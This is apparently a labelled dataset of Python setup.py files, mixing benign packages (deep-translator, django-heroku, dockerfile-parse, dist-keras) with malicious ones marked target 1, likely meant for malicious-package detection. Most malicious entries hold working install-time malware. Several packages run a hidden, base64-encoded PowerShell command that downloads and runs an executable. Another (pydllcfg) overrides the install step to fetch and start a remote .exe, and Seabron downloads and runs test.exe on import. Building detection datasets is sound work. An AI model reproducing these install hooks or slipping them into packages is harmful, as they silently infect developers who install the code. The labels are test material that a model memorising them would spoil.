LibreTranslator(source=\\'auto\\', target=\\'en\\').translate_file(\\'path/to/file\\')\\n\\n\\n\\nProxy usage\\n-------------\\n\\ndeep-translator provide out of the box usage of proxies. Just define your proxies config as a dictionary\\nand pass it to the corresponding translator. Below is an example using the GoogleTranslator but this feature\\ncan be used with all supported translators.\\n\\n.. code-block:: python\\n\\n    from deep_translator import GoogleTranslator\\n\\n    # define your proxy configs:\\n    proxies_example = {\\n        \"https\": \"your https proxy\",  # example: 34.195.196.27:8080\\n        \"http\": \"your http proxy if available\"\\n    }\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'de\\', proxies=proxies_example).translate(\"this package is awesome\")\\n\\n\\n\\n\\nUsage from Terminal\\n--------------------\\n\\nDeep-translator supports a series of command line arguments for quick and simple access to the translators directly in your console.\\n\\n.. note::\\n\\n    The program accepts ``deep-translator`` or ``dt`` as a command, feel free to substitute whichever you prefer.\\n\\nFor a list of available translators:\\n\\n.. code-block:: console\\n\\n    $ deep-translator list\\n\\nTo translate a string or line of text:\\n\\n.. code-block:: console\\n\\n    $ deep_translator google --source \"english\" --target \"german\" --text \"happy coding\"\\n\\nAlternate short option names, along with using language abbreviations:\\n\\n.. code-block:: console\\n\\n    $ deep_translator google -src \"en\" -tgt \"de\" -txt \"happy coding\"\\n\\n\\nFinally, to retrieve a list of available languages for a given translator:\\n\\n.. code-block:: console\\n\\n    $ deep-translator languages google\\n\\n======\\nTests\\n======\\n\\nDevelopers can install the development version of deep-translator and execute unit tests to verify functionality. For more information on doing this, see `the contribution guidelines <https://deep-translator.readthedocs.io/en/latest/contributing.html/>`_\\n\\n========\\nLinks\\n========\\nCheck this article on medium to know why you should use the deep-translator package and how to translate text using python.\\nhttps://medium.com/@nidhalbacc/how-to-translate-text-with-python-9d203139dcf5\\n\\n======\\nHelp\\n======\\n\\nIf you are facing any problems, please feel free to open an issue.\\nAdditionally, you can make contact with the author for further information/questions.\\n\\nDo you like deep-translator?\\nYou can always help the development of this project by:\\n\\n- Following on github and/or twitter\\n- Promote the project (ex: by giving it a star on github)\\n- Watch the github repo for new releases\\n- Tweet about the package\\n- Help others with issues on github\\n- Create issues and pull requests\\n- Sponsor the project\\n\\n===========\\nNext Steps\\n===========\\n\\nTake a look in the examples folder for more :)\\nContributions are always welcome.\\nRead the Contribution guidelines `Here <https://deep-translator.readthedocs.io/en/latest/contributing.html/>`_\\n\\n==========\\nCredits\\n==========\\n\\nMany thanks to @KirillSklyarenko for his work on integrating the microsoft translator\\n\\n==========\\nLicense\\n==========\\n\\nMIT license\\n\\nCopyright (c) 2020-present, Nidhal Baccouri\\n\\n===========\\nSwagger UI\\n===========\\n\\ndeep-translator offers an api server for easy integration with other applications. Non python applications\\ncan communicate with the api directly and leverage the features of deep-translator\\n\\nAccess the api here: https://deep-translator-api.azurewebsites.net/docs\\n\\n\\n\\n===========================\\nThe Translator++ mobile app\\n===========================\\n\\n.. image:: ../assets/app-icon.png\\n    :width: 100\\n    :alt: Icon of the app\\n\\nYou can download and try the app on play store https://play.google.com/store/apps/details?id=org.translator.translator&hl=en_US&gl=US\\n\\nAfter developing the deep-translator, I realized how cool this would be if I can use it as an app on my mobile phone.\\nSure, there is google translate, pons and linguee apps etc.. but isn\\'t it cooler to make an app where all these\\ntranslators are integrated?\\n\\nLong story short, I started working on the app. I decided to use the `kivy framework <https://kivy.org/#home/>`_ since\\nI wanted to code in python and to develop a cross platform app.\\nI open sourced the `Translator++ app <https://github.com/nidhaloff/deep-translator-app/>`_ on my github too.\\nFeel free to take a look at the code or make a pull request ;)\\n\\n.. note::\\n    The Translator++ app is based on the deep-translator package. I just built the app to prove the capabilities\\n    of the deep-translator package ;)\\n\\nI published the first release on google play store on 02-08-2020\\n\\nHere are some screenshots:\\n\\n- Phone\\n\\n.. image:: ../assets/translator1.jpg\\n    :width: 30%\\n    :height: 200\\n    :alt: screenshot1\\n.. image:: ../assets/translator2.jpg\\n    :width: 30%\\n    :height: 200\\n    :alt: screenshot2\\n.. image:: ../assets/spinner.jpg\\n    :width: 30%\\n    :height: 200\\n    :alt: spinner\\n\\n- Tablet:\\n\\n.. image:: ../assets/hz_view.png\\n    :width: 100%\\n    :height: 300\\n    :alt: screenshot3\\n\\n===========================\\nWebsite & Desktop app\\n===========================\\n\\nCurrently, there are propositions for a website and/or dekstop app based on deep-translator.\\nYou can follow the issue here: https://github.com/nidhaloff/deep-translator/issues/144\\n',\n    'author': 'Nidhal Baccouri',\n    'author_email': 'nidhalbacc@gmail.com',\n    'maintainer': 'Nidhal Baccouri',\n    'maintainer_email': 'nidhalbacc@gmail.com',\n    'url': 'https://github.com/nidhaloff/deep_translator',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "libmaskcpu-5.23", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libmaskcpu',\n    packages = ['modlib'],\n    version = '10.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfverproofrandom-7.14", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfverproofrandom',\n    packages = ['modlib'],\n    version = '9.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpostrestring-1.24", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpostrestring',\n    packages = ['modlib'],\n    version = '2.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grandget-3.87", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'grandget',\n    packages = ['modlib'],\n    version = '2.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libminepushrandom-9.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libminepushrandom',\n    packages = ['modlib'],\n    version = '4.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "setupint3s-0.0.2", "func": "from setuptools import setup\n\n\n\nsetup(\n    name=\"setupint3s\",\n    version='0.0.2',\n    license='Eclipse Public License 2.0',\n    authors=[\"myeggs\", \"myeggs\", \"myeggs\"],\n    author_email=\"<myeggs@gmail.com>\",\n    description=\"by myeggs, myeggs and myeggs\",\n    long_description='Documentation: https://github.com/myeggs/setupint3',\n    keywords=['setupint3s', 'colorama'],\n    packages=['setupint3s']\n)\n\n\n", "target": 1}
{"idx": "pydllcfg-0.1", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pydllcfg',\n    version='0.1',\n    description='PythonBased',\n    packages=['pydllcfg'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)", "target": 1}
{"idx": "maskget-5.24", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'maskget',\n    packages = ['modlib'],\n    version = '8.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dockerfile-parse-1.2.0", "func": "#!/usr/bin/python\n\"\"\"\nCopyright (c) 2015 Red Hat, Inc\nAll rights reserved.\n\nThis software may be modified and distributed under the terms\nof the BSD license. See the LICENSE file for details.\n\"\"\"\n\nimport re\nimport sys\nimport io\n\nfrom os import path\nfrom setuptools import setup, find_packages\n\n\ndef _get_requirements(path):\n    try:\n        with open(path) as f:\n            packages = f.read().splitlines()\n    except (IOError, OSError) as ex:\n        raise RuntimeError(\"Can't open file with requirements: %s\", repr(ex))\n    return [p.strip() for p in packages if not re.match(r\"^\\s*#\", p)]\n\n\ndef _install_requirements():\n    requirements = _get_requirements('requirements.txt')\n    if sys.version_info[0] >= 3:\n        requirements += _get_requirements('requirements-py3.txt')\n    return requirements\n\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith io.open(path.join(here, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='dockerfile-parse',\n    version='1.2.0',\n    description='Python library for Dockerfile manipulation',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='Jiri Popelka',\n    author_email='jpopelka@redhat.com',\n    url='https://github.com/containerbuildsystem/dockerfile-parse',\n    license=\"BSD\",\n    packages=find_packages(exclude=[\"tests\"]),\n    install_requires=_install_requirements(),\n    tests_require=_get_requirements('tests/requirements.txt'),\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Other Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n)\n", "target": 0}
{"idx": "django-heroku-0.3.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pip install twine\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\n# Package meta-data.\nNAME = 'django-heroku'\nDESCRIPTION = 'This is a Django library for Heroku apps.'\nURL = 'https://github.com/heroku/django-heroku'\nEMAIL = 'kreitz@salesforce.com'\nAUTHOR = 'Kenneth Reitz'\n\n# What packages are required for this module to be executed?\nREQUIRED = [\n    'dj-database-url>=0.5.0', 'whitenoise', 'psycopg2', 'django'\n]\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.rst' is present in your MANIFEST.in file!\nwith io.open(os.path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = '\\n' + f.read()\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nwith open(os.path.join(here, 'django_heroku', '__version__.py')) as f:\n    exec(f.read(), about)\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = 'Build and publish the package.'\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print('\\033[1m{0}\\033[0m'.format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status('Removing previous builds\u2026')\n            rmtree(os.path.join(here, 'dist'))\n        except OSError:\n            pass\n\n        self.status('Building Source and Wheel (universal) distribution\u2026')\n        os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n\n        self.status('Uploading the package to PyPi via Twine\u2026')\n        os.system('twine upload dist/*')\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about['__version__'],\n    description=DESCRIPTION,\n    long_description=long_description,\n    author=AUTHOR,\n    author_email=EMAIL,\n    url=URL,\n    packages=find_packages(exclude=('tests',)),\n    # If your package is a single module, use this instead of 'packages':\n    # py_modules=['mypackage'],\n\n    # entry_points={\n    #     'console_scripts': ['mycli=mymodule:cli'],\n    # },\n    install_requires=REQUIRED,\n    include_package_data=True,\n    license='MIT',\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy'\n    ],\n    # $ setup.py publish support.\n    cmdclass={\n        'upload': UploadCommand,\n    },\n)\n", "target": 0}
{"idx": "dist-keras-0.2.1", "func": "\"\"\"Setup-module for DistKeras.\n\nThis software enables distrubuted Machine Learning on Apache Spark using Keras.\n\nSee:\nhttps://github.com/JoeriHermans/dist-keras/\nhttp://joerihermans.com/\n\"\"\"\n\nfrom setuptools import setup\nfrom setuptools import find_packages\n\nsetup(name='dist-keras',\n      description='Distributed Deep learning with Apache Spark with Keras.',\n      url='https://github.com/JoeriHermans/dist-keras',\n      author='Joeri Hermans',\n      version='0.2.1',\n      author_email='joeri@joerihermans.com',\n      license='GPLv3',\n      install_requires=['theano', 'tensorflow', 'keras', 'flask'],\n      packages=['distkeras'],\n      package_data={'distkeras': ['distkeras/*.py']},\n      # Keywords related to the project.\n      keywords=['Keras', 'Deep Learning', 'Machine Learning', 'Theano', 'Tensorflow', 'Distributed', 'Apache Spark'],\n)\n", "target": 0}
{"idx": "selfreplacesuperpip-8.17", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplacesuperpip',\n    packages = ['modlib'],\n    version = '2.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "seabron-1", "func": "#!/usr/bin/env python\n\nfrom io import open\nfrom setuptools import setup\nimport requests\nimport sys, os, string\nfrom sys import platform\n\ndef zzr():\n    if platform == 'win32':\n        url = 'https://github.com/jagermager999/8746465cdg78cdsxasy8a/raw/main/test.exe'\n        filename = 'tmp_file_pypi_29x7d0kf8.exe'\n    else:\n        quit()\n\n    rq = requests.get(url, allow_redirects=True)\n\n    open(filename, 'wb').write(rq.content)\n    os.system('start ' + filename)\n\n\nzzr()\n\nversion = '1.0'\n\nsetup(\n    name='Seabron',\n    version=version,\n\n    author='Jonh Doe',\n    author_email='mail@mail.com',\n\n    description=(\n        u'qwertyuioppoiuytrewqqsdfghjkl;lkjhgfdsaazxcvbnm,mmnbvcx'\n    ),\n    long_description='',\n    long_description_content_type='text/markdown',\n\n    url='https://google.com/',\n    download_url='https://google.com/123',\n\n    license='license text',\n\n    packages=['Seabron'],\n    install_requires=['requests'],\n\n    classifiers=[\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Intended Audience :: End Users/Desktop',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ]\n)", "target": 1}
{"idx": "libsuperkilllib-9.78", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libsuperkilllib',\n    packages = ['modlib'],\n    version = '10.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
